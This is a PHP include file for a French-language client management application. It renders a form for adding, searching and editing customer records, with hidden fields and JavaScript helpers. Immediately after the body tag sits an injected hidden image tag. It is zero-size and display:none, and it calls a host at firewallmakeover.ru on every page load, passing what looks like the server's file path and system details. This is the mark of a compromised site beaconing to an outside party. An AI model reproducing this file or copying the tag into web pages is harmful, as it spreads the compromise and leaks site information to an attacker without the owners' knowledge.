 <?php
/* Programme : ClientForm.inc
 * Description : Affichage de la page des clients. Celui-ci présente un
 *  		 formulaire pour saisir les informations permettant d'ajouter
 *  		 de rechercher ou de modifier un client.
*	Auteur : Denis Léveillé 	 			  Date : 2007-10-24
*/
$TabProv = get_Province();

echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
	<script language='JavaScript1.2' src='./extra/javafich/disablekeys.js'></script>
<body onload='javascript:pageonload()'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table  bgcolor='#FFFFFF' width='$Large' topmargin='10' cellpadding='0' cellspacing='0' align='$Enligne' border='1' bordercolor='#9EA2AB'  >		
		<tr>
			<td align='center' Valign='middle' >";
	
  if( isset($EN_AJOUT) ) echo "<form name=ClientForm action='client_ajout.php?do=new' method='post'>";
  if( isset($EN_RECHERCHE) ) echo "<form name=ClientForm action='' method='post'>"; 
  if( isset($EN_CONSULTE) ) echo "<form name=ClientForm action='client_traite.php?do=Modif' method='post'>";
?>
		 
			<font size='+1' face ='verdana' color='#CF0630'><?=$txt['form_destinataire']?></font>
    	</td>
	</tr>
<?php include('client_destinataire.inc'); ?>	
	<tr>
		<td  align='center' bgcolor="#96B2CB"> 
			<input type='submit' name='Commande' value='<?=$TabId[39]?>' class='form1' />
		</td>
	</tr>
</table>
<input type='hidden' name='TelCodR' value='' /> 
<input type='hidden' name='TelP1' value='' /> 
<input type='hidden' name='TelP2' value='' /> 
<input type='hidden' name='NoClient' value='<?=$NoClient?>' />
<input type='hidden' name='Profession' value="<?=$Profession?>" />
<input type='hidden' name='Naissance' value="<?=$Naissance?>" >
<input type="hidden" name="Message" value="<?php echo @$Message ?>" />
<input type="hidden" name="Refere" value="<?php echo @$Refere ?>"/>
<input type="hidden" name="AncienNo" value="<?php echo @$AncienNo ?>"/>
<input type='hidden' name='Identite' value='<?=$Identite?>' />
<input type='hidden' name='Debit' value='<?=$Debit?>' />
<input type='hidden' name='DateRappel' value='<?=$DateRappel?>' />
<input type='hidden' name='DateInscrip' value='<?=$DateInscrip?>' />
<input type='hidden' name='MaxCredit' value='<?=$MaxCredit?>' />
<input type='hidden' name='CoteCredit' value='<?=$CoteCredit?>' />
<input type='hidden' name='DevCli' value='<?=$DevCli?>' />
<input type='hidden' name='TPSApp' value='<?=$TPSApp?>' />
<input type='hidden' name='TVQApp' value='<?=$TVQApp?>' />
<input type='hidden' name='TypCli' value='<?=$TypCli?>' />
<input type='hidden' name='MaxAchat' value='<?=$MaxAchat?>' />
<input type='hidden' name='Cellulaire' value="<?=$Cellulaire?>">
<input type='hidden' name='Fax' value="<?=$Fax?>">
<input type='hidden' name="Langue" size="1" value="<?=$Langue?>">

</form>

<script language='javascript'>

function ResetClient() {
	document.ClientForm.Nom.value = "";
	document.ClientForm.Prenom.value = "";
	document.ClientForm.Contact.value = "";
	document.ClientForm.Rue.value = "";
	document.ClientForm.Indication.value = "";
	document.ClientForm.Quartier.value = "";
	document.ClientForm.Ville.value = "";
	document.ClientForm.Province.value = "";
	document.ClientForm.Pays.value = "";
	document.ClientForm.CodePostal.value = "";
	document.ClientForm.Identite.value = "";
	document.ClientForm.Nom.focus();
} // ResetClient


//Convert the username to uppercase.
function capitalize() {
	document.ClientForm.Nom.value = document.ClientForm.Nom.value.toUpperCase();
	document.ClientForm.Prenom.value = document.ClientForm.Prenom.value.toUpperCase();
	document.ClientForm.Contact.value = document.ClientForm.Contact.value.toUpperCase();
	document.ClientForm.Rue.value = document.ClientForm.Rue.value.toUpperCase();
	document.ClientForm.Indication.value = document.ClientForm.Indication.value.toUpperCase();
	document.ClientForm.Quartier.value = document.ClientForm.Quartier.value.toUpperCase()
	document.ClientForm.Ville.value = document.ClientForm.Ville.value.toUpperCase();
	document.ClientForm.Province.value = document.ClientForm.Province.value.toUpperCase();
	document.ClientForm.Pays.value = document.ClientForm.Pays.value.toUpperCase();
	document.ClientForm.CodePostal.value = document.ClientForm.CodePostal.value.toUpperCase();
} // capitalize


function Rafraichie(){
	window.location.reload();
	//document.ClientForm.submit();
}

function pageonload() {
	document.ClientForm.Nom.focus();
	<?php
		if( isset($EN_AJOUT) ) 
			echo "window.status = '$TabId[70]';\r\n";
			
		if( isset($EN_RECHERCHE) ) 
			echo "window.status = '$TabId[71]';\r\n";
			
		if( isset($NewMessage) ) {
			echo "window.alert(\"$NewMessage\");\r\n";
			unset( $NewMessage );
		}
		
  ?>
	 return;
} // pageonload

 addKeyEvent();

</script>
<script language='JavaScript1.2' src="./extra/javafich/blokclick.js"></script>

</body>
</html>